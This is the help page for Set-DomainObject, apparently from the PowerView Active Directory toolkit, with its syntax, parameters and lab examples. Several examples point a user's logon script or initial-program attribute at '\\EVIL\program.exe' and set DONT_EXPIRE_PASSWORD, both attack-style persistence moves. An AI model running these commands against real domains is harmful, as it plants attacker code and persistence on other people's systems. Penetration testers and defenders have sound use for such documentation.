# Set-DomainObject

## SYNOPSIS
Modifies a gven property for a specified active directory object.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainObject

## SYNTAX

```
Set-DomainObject [[-Identity] <String[]>] [-Set <Hashtable>] [-XOR <Hashtable>] [-Clear <String[]>]
 [-Domain <String>] [-LDAPFilter <String>] [-SearchBase <String>] [-Server <String>] [-SearchScope <String>]
 [-ResultPageSize <Int32>] [-ServerTimeLimit <Int32>] [-Tombstone] [-Credential <PSCredential>]
```

## DESCRIPTION
Splats user/object targeting parameters to Get-DomainObject, returning the raw
searchresult object.
Retrieves the raw directoryentry for the object, and sets
any values from -Set @{}, XORs any values from -XOR @{}, and clears any values
from -Clear @().

## EXAMPLES

### -------------------------- EXAMPLE 1 --------------------------
```
Set-DomainObject testuser -Set @{'mstsinitialprogram'='\\EVIL\program.exe'} -Verbose
```

VERBOSE: Get-DomainSearcher search string: LDAP://PRIMARY.testlab.local/DC=testlab,DC=local
VERBOSE: Get-DomainObject filter string: (&(|(samAccountName=testuser)))
VERBOSE: Setting mstsinitialprogram to \\\\EVIL\program.exe for object testuser

### -------------------------- EXAMPLE 2 --------------------------
```
"S-1-5-21-890171859-3433809279-3366196753-1108","testuser" | Set-DomainObject -Set @{'countrycode'=1234; 'mstsinitialprogram'='\\EVIL\program2.exe'} -Verbose
```

VERBOSE: Get-DomainSearcher search string: LDAP://PRIMARY.testlab.local/DC=testlab,DC=local
VERBOSE: Get-DomainObject filter string:
(&(|(objectsid=S-1-5-21-890171859-3433809279-3366196753-1108)))
VERBOSE: Setting mstsinitialprogram to \\\\EVIL\program2.exe for object harmj0y
VERBOSE: Setting countrycode to 1234 for object harmj0y
VERBOSE: Get-DomainSearcher search string:
LDAP://PRIMARY.testlab.local/DC=testlab,DC=local
VERBOSE: Get-DomainObject filter string: (&(|(samAccountName=testuser)))
VERBOSE: Setting mstsinitialprogram to \\\\EVIL\program2.exe for object testuser
VERBOSE: Setting countrycode to 1234 for object testuser

### -------------------------- EXAMPLE 3 --------------------------
```
"S-1-5-21-890171859-3433809279-3366196753-1108","testuser" | Set-DomainObject -Clear department -Verbose
```

Cleares the 'department' field for both object identities.

### -------------------------- EXAMPLE 4 --------------------------
```
Get-DomainUser testuser | ConvertFrom-UACValue -Verbose
```

Name                           Value
----                           -----
NORMAL_ACCOUNT                 512


Set-DomainObject -Identity testuser -XOR @{useraccountcontrol=65536} -Verbose

VERBOSE: Get-DomainSearcher search string: LDAP://PRIMARY.testlab.local/DC=testlab,DC=local
VERBOSE: Get-DomainObject filter string: (&(|(samAccountName=testuser)))
VERBOSE: XORing 'useraccountcontrol' with '65536' for object 'testuser'

Get-DomainUser testuser | ConvertFrom-UACValue -Verbose

Name                           Value
----                           -----
NORMAL_ACCOUNT                 512
DONT_EXPIRE_PASSWORD           65536

### -------------------------- EXAMPLE 5 --------------------------
```
Get-DomainUser -Identity testuser -Properties scriptpath
```

scriptpath
----------
\\\\primary\sysvol\blah.ps1

$SecPassword = ConvertTo-SecureString 'Password123!'-AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Set-DomainObject -Identity testuser -Set @{'scriptpath'='\\\\EVIL\program2.exe'} -Credential $Cred -Verbose
VERBOSE: \[Get-Domain\] Using alternate credentials for Get-Domain
VERBOSE: \[Get-Domain\] Extracted domain 'TESTLAB' from -Credential
VERBOSE: \[Get-DomainSearcher\] search string: LDAP://PRIMARY.testlab.local/DC=testlab,DC=local
VERBOSE: \[Get-DomainSearcher\] Using alternate credentials for LDAP connection
VERBOSE: \[Get-DomainObject\] Get-DomainObject filter string: (&(|(|(samAccountName=testuser)(name=testuser))))
VERBOSE: \[Set-DomainObject\] Setting 'scriptpath' to '\\\\EVIL\program2.exe' for object 'testuser'

Get-DomainUser -Identity testuser -Properties scriptpath

scriptpath
----------
\\\\EVIL\program2.exe

## PARAMETERS

### -Identity
A SamAccountName (e.g.
harmj0y), DistinguishedName (e.g.
CN=harmj0y,CN=Users,DC=testlab,DC=local),
SID (e.g.
S-1-5-21-890171859-3433809279-3366196753-1108), or GUID (e.g.
4c435dd7-dc58-4b14-9a5e-1fdb0e80d201).
Wildcards accepted.

```yaml
Type: String[]
Parameter Sets: (All)
Aliases: DistinguishedName, SamAccountName, Name

Required: False
Position: 1
Default value: None
Accept pipeline input: True (ByPropertyName, ByValue)
Accept wildcard characters: False
```

### -Set
Specifies values for one or more object properties (in the form of a hashtable) that will replace the current values.

```yaml
Type: Hashtable
Parameter Sets: (All)
Aliases: Reaplce

Required: False
Position: Named
Default value: None
Accept pipeline input: False
Accept wildcard characters: False
```

### -XOR
Specifies values for one or more object properties (in the form of a hashtable) that will XOR the current values.

```yaml
Type: Hashtable
Parameter Sets: (All)
Aliases: 

Required: False
Position: Named
Default value: None
Accept pipeline input: False
Accept wildcard characters: False
```

### -Clear
Specifies an array of object properties that will be cleared in the directory.

```yaml
Type: String[]
Parameter Sets: (All)
Aliases: 

Required: False
Position: Named
Default value: None
Accept pipeline input: False
Accept wildcard characters: False
```

### -Domain
Specifies the domain to use for the query, defaults to the current domain.

```yaml
Type: String
Parameter Sets: (All)
Aliases: 

Required: False
Position: Named
Default value: None
Accept pipeline input: False
Accept wildcard characters: False
```

### -LDAPFilter
Specifies an LDAP query string that is used to filter Active Directory objects.

```yaml
Type: String
Parameter Sets: (All)
Aliases: Filter

Required: False
Position: Named
Default value: None
Accept pipeline input: False
Accept wildcard characters: False
```

### -SearchBase
The LDAP source to search through, e.g.
"LDAP://OU=secret,DC=testlab,DC=local"
Useful for OU queries.

```yaml
Type: String
Parameter Sets: (All)
Aliases: ADSPath

Required: False
Position: Named
Default value: None
Accept pipeline input: False
Accept wildcard characters: False
```

### -Server
Specifies an Active Directory server (domain controller) to bind to.

```yaml
Type: String
Parameter Sets: (All)
Aliases: DomainController

Required: False
Position: Named
Default value: None
Accept pipeline input: False
Accept wildcard characters: False
```

### -SearchScope
Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).

```yaml
Type: String
Parameter Sets: (All)
Aliases: 

Required: False
Position: Named
Default value: Subtree
Accept pipeline input: False
Accept wildcard characters: False
```

### -ResultPageSize
Specifies the PageSize to set for the LDAP searcher object.

```yaml
Type: Int32
Parameter Sets: (All)
Aliases: 

Required: False
Position: Named
Default value: 200
Accept pipeline input: False
Accept wildcard characters: False
```

### -ServerTimeLimit
Specifies the maximum amount of time the server spends searching.
Default of 120 seconds.

```yaml
Type: Int32
Parameter Sets: (All)
Aliases: 

Required: False
Position: Named
Default value: 0
Accept pipeline input: False
Accept wildcard characters: False
```

### -Tombstone
Switch.
Specifies that the searcher should also return deleted/tombstoned objects.

```yaml
Type: SwitchParameter
Parameter Sets: (All)
Aliases: 

Required: False
Position: Named
Default value: False
Accept pipeline input: False
Accept wildcard characters: False
```

### -Credential
A \[Management.Automation.PSCredential\] object of alternate credentials
for connection to the target domain.

```yaml
Type: PSCredential
Parameter Sets: (All)
Aliases: 

Required: False
Position: Named
Default value: [Management.Automation.PSCredential]::Empty
Accept pipeline input: False
Accept wildcard characters: False
```

## INPUTS

## OUTPUTS

## NOTES

## RELATED LINKS

